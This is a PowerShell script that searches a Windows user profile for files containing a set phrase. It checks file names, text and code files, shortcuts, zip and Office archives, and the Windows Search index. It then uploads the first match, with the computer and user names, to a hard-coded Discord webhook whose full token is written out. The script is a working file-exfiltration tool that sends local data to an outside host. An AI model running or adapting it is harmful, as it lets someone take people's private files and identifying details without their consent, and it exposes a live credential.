# ================== CONFIG ==================
$Webhook   = 'https://discord.com/api/webhooks/1139429205331943585/4ujfdxXnCzU2gbY8T_u-HtmJ3M2i9edu_bB6kW4-8uIZihDvw60qjIjadon1FCzPAxs7'  # <-- put your webhook here
$Phrase    = 'alexbryanflag'                               # search phrase
$Root      = $env:USERPROFILE                              # change to narrow search (faster)
$MaxSize   = 10MB                                          # typical non-Nitro limit
$AutoZipIfTooBig = $true                                   # zip single file if > MaxSize
# ===========================================

# --------- Setup / Assemblies ----------
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
try { Add-Type -AssemblyName System.Net.Http                | Out-Null } catch {}
try { Add-Type -AssemblyName System.Web                     | Out-Null } catch {}
try { Add-Type -AssemblyName System.IO.Compression          | Out-Null } catch {}
try { Add-Type -AssemblyName System.IO.Compression.FileSystem| Out-Null } catch {}

# --------- Helpers ----------
$skip = '\\(node_modules|\.git|bin|obj|dist|build|AppData\\Local\\(Packages|Temp))(\\|$)'

function Ret($path,$note){ [pscustomobject]@{ Path = $path; Note = $note } }

function New-CleanWebhookUri([string]$Webhook){
    if ($Webhook -isnot [string]) { $Webhook = [string]$Webhook }
    $Webhook = [regex]::Replace($Webhook, '\p{C}', '').Trim()
    try {
        $ub = [System.UriBuilder]::new($Webhook)
        $q  = [System.Web.HttpUtility]::ParseQueryString($ub.Query)
        $q['wait'] = 'true'
        $ub.Query = $q.ToString()
        return $ub.Uri
    } catch {
        throw "Invalid webhook URL: '$Webhook'"
    }
}

function Send-DiscordFile {
    param(
        [Parameter(Mandatory)][string]$Webhook,
        [Parameter(Mandatory)][string]$FilePath,
        [string]$Message = ""
    )
    if (-not $FilePath) { throw "No file path provided." }
    if (-not (Test-Path -LiteralPath $FilePath)) { throw "File not found: $FilePath" }
    $Full = (Resolve-Path -LiteralPath $FilePath).Path

    # Optionally zip if too big
    $fi = Get-Item -LiteralPath $Full
    if ($fi.Length -gt $MaxSize) {
        if (-not $AutoZipIfTooBig) {
            throw "File exceeds $([Math]::Round($MaxSize/1MB)) MB (size=$([Math]::Round($fi.Length/1MB,2)) MB)."
        }
        $zipPath = Join-Path $env:TEMP ("upload_" + [IO.Path]::GetFileName($Full) + "_" + [Guid]::NewGuid().ToString("N") + ".zip")
        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
        $zip = [IO.Compression.ZipArchive]::new([IO.File]::Open($zipPath,'Create'), [IO.Compression.ZipArchiveMode]::Create)
        try {
            $entry = $zip.CreateEntry([IO.Path]::GetFileName($Full))
            $inS   = [IO.File]::OpenRead($Full)
            $outS  = $entry.Open()
            try { $inS.CopyTo($outS) } finally { $outS.Dispose(); $inS.Dispose() }
        } finally { $zip.Dispose() }
        $Full = $zipPath
        $fi   = Get-Item -LiteralPath $Full
        if ($fi.Length -gt $MaxSize) { throw "Zipped file still exceeds limit ($([Math]::Round($fi.Length/1MB,2)) MB)." }
    }

    $PostUri = New-CleanWebhookUri $Webhook

    $json = @{ content = $Message } | ConvertTo-Json -Compress
    $content = [System.Net.Http.MultipartFormDataContent]::new()
    $content.Add([System.Net.Http.StringContent]::new($json,[Text.Encoding]::UTF8,'application/json'),'payload_json')

    $fs = [IO.File]::OpenRead($Full)
    try {
        $fc = [System.Net.Http.StreamContent]::new($fs)
        $fc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/octet-stream')
        $content.Add($fc,'files[0]',(Split-Path $Full -Leaf))

        $client = [System.Net.Http.HttpClient]::new()
        # Write-Host "POST => $($PostUri.AbsoluteUri)"
        $resp   = $client.PostAsync($PostUri, $content).Result
        $body   = $resp.Content.ReadAsStringAsync().Result
        if (-not $resp.IsSuccessStatusCode) { throw "Upload failed: $($resp.StatusCode) $body" }

        $msg = $body | ConvertFrom-Json
        try {
            $wk  = Invoke-RestMethod -Method Get -Uri $Webhook
            $url = "https://discord.com/channels/$($wk.guild_id)/$($wk.channel_id)/$($msg.id)"
            Write-Host "✅ Uploaded: $Full"
            Write-Host "🔗 $url"
        } catch {
            Write-Host "✅ Uploaded (message id $($msg.id))"
        }
    } finally {
        $fs.Dispose(); $content.Dispose(); if ($client){ $client.Dispose() }
    }
}

function Find-InFilenames {
    param([string]$Root,[string]$Phrase)
    Get-ChildItem $Root -Recurse -File -ErrorAction SilentlyContinue |
      Where-Object { $_.FullName -notmatch $skip -and $_.Name -like "*$Phrase*" } |
      Sort-Object LastWriteTimeUtc -Descending |
      Select-Object -First 1 |
      ForEach-Object { Ret $_.FullName "filename match" }
}

function Find-InPlainText {
    param([string]$Root,[string]$Phrase)
    $ext = '*.txt','*.md','*.log','*.bat','*.cmd','*.ps1','*.psm1','*.json','*.xml',
           '*.cs','*.js','*.ts','*.py','*.cpp','*.c','*.h','*.shader','*.ini','*.cfg',
           '*.sql','*.html','*.css','*.yml','*.yaml'
    $hit = Get-ChildItem $Root -Recurse -File -Include $ext -ErrorAction SilentlyContinue |
           Where-Object { $_.FullName -notmatch $skip } |
           Select-String -Pattern $Phrase -SimpleMatch -List -ErrorAction SilentlyContinue |
           Sort-Object { (Get-Item $_.Path).LastWriteTimeUtc } -Descending |
           Select-Object -First 1
    if ($hit) { Ret ((Resolve-Path -LiteralPath $hit.Path).Path) "content match (text/code)" }
}

function Find-InShortcuts {
    param([string]$Root,[string]$Phrase)
    $targets = Get-ChildItem $Root -Recurse -File -ErrorAction SilentlyContinue |
               Where-Object { $_.Extension -match '\.(lnk|url)$' -and $_.FullName -notmatch $skip }
    if (-not $targets) { return $null }
    $ws = New-Object -ComObject WScript.Shell

    foreach($lnk in ($targets | Where-Object Extension -eq '.lnk')){
        try {
            $s = $ws.CreateShortcut($lnk.FullName)
            if ($lnk.BaseName -like "*$Phrase*" -or
                ($s.TargetPath      -and $s.TargetPath      -like "*$Phrase*") -or
                ($s.Arguments       -and $s.Arguments       -like "*$Phrase*") -or
                ($s.Description     -and $s.Description     -like "*$Phrase*") -or
                ($s.WorkingDirectory-and $s.WorkingDirectory-like "*$Phrase*")) {
                return Ret $lnk.FullName "shortcut (.lnk) match"
            }
        } catch {}
    }
    foreach($u in ($targets | Where-Object Extension -eq '.url')){
        try {
            if (Select-String -Path $u.FullName -Pattern $Phrase -SimpleMatch -Quiet) {
                return Ret $u.FullName "shortcut (.url) content match"
            }
        } catch {}
    }
    $null
}

function Find-InZips {
    param([string]$Root,[string]$Phrase)
    $zipExt = '*.zip','*.jar','*.nupkg','*.docx','*.pptx','*.xlsx'
    $inside = @(
      '*.txt','*.md','*.json','*.xml','*.csv','*.cfg','*.ini','*.log',
      '*.cs','*.js','*.ts','*.py','*.ps1','*.bat','*.cmd','*.html','*.css',
      '*.yml','*.yaml','*.shader','*.sql',
      'word/*.xml','ppt/slides/*.xml','xl/*.xml'  # Office OpenXML internals
    )
    $comp = [StringComparison]::OrdinalIgnoreCase

    $archives = Get-ChildItem $Root -Recurse -File -Include $zipExt -ErrorAction SilentlyContinue |
                Where-Object { $_.FullName -notmatch $skip } |
                Sort-Object LastWriteTimeUtc -Descending

    foreach ($zf in $archives) {
        try {
            $fs  = [IO.File]::OpenRead($zf.FullName)
            $zip = [IO.Compression.ZipArchive]::new($fs, [IO.Compression.ZipArchiveMode]::Read)
            foreach ($entry in $zip.Entries) {
                $match = $false
                foreach ($pat in $inside) { if ($entry.FullName -like $pat) { $match = $true; break } }
                if (-not $match) { continue }
                try {
                    $sr = [IO.StreamReader]::new($entry.Open(), [Text.Encoding]::UTF8, $true)
                    $text = $sr.ReadToEnd()
                    $sr.Close()
                    if ($text.IndexOf($Phrase, $comp) -ge 0) {
                        $safeName = ($entry.FullName -replace '[\\/:*?"<>|]','_')
                        $out = Join-Path $env:TEMP ("ziphit_" + [Guid]::NewGuid().ToString("N") + "_" + $safeName)
                        $inS  = $entry.Open()
                        $outS = [IO.File]::Create($out)
                        try { $inS.CopyTo($outS) } finally { $outS.Dispose(); $inS.Dispose() }
                        $zip.Dispose(); $fs.Close()
                        return Ret $out "archive match: $($zf.FullName)::/$($entry.FullName)"
                    }
                } catch {}
            }
            $zip.Dispose(); $fs.Close()
        } catch {}
    }
    $null
}

function Find-InIndexOfficePdf {
    param([string]$Root,[string]$Phrase)
    try {
        $escRoot = $Root.Replace('\','\\')
        $cn  = New-Object -ComObject ADODB.Connection
        $cmd = New-Object -ComObject ADODB.Command
        $cn.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows'")
        $cmd.ActiveConnection = $cn
        $cmd.CommandText = @"
SELECT System.ItemPathDisplay
FROM SYSTEMINDEX
WHERE SCOPE = 'file:$escRoot\'
  AND CONTAINS('"$Phrase"')
  AND System.FileExtension IN ('.docx','.pptx','.xlsx','.pdf','.rtf')
ORDER BY System.Search.Rank DESC
"@
        $rs = $cmd.Execute()
        if (-not $rs.EOF) {
            $p = $rs.Fields.Item("System.ItemPathDisplay").Value
            if ($p -and (Test-Path -LiteralPath $p)) { return Ret $p "indexed Office/PDF match" }
        }
        $rs.Close(); $cn.Close()
    } catch {}
    $null
}

# --------- MAIN ---------
Write-Host "🔎 Searching under $Root for '$Phrase' ..."

$res = $null
# 1) filename
if (-not $res) { $res = Find-InFilenames -Root $Root -Phrase $Phrase }
# 2) plain text/code
if (-not $res) { $res = Find-InPlainText -Root $Root -Phrase $Phrase }
# 3) shortcuts anywhere under root
if (-not $res) { $res = Find-InShortcuts -Root $Root -Phrase $Phrase }
# 4) zip & zip-based internals
if (-not $res) { $res = Find-InZips -Root $Root -Phrase $Phrase }
# 5) Windows index (Office/PDF/RTF)
if (-not $res) { $res = Find-InIndexOfficePdf -Root $Root -Phrase $Phrase }

if (-not $res) {
    Write-Host "❌ No file containing '$Phrase' found."
    Write-Host "Tip: set a narrower root for speed, e.g.:  `$Root = '$env:USERPROFILE\Documents'`  and rerun."
    return
}

Write-Host "✅ Found ($($res.Note)): $($res.Path)"
$msg = "✅ Found on $env:COMPUTERNAME by $env:USERNAME:`n$($res.Path)`nNote: $($res.Note)"
Send-DiscordFile -Webhook $Webhook -FilePath $res.Path -Message $msg
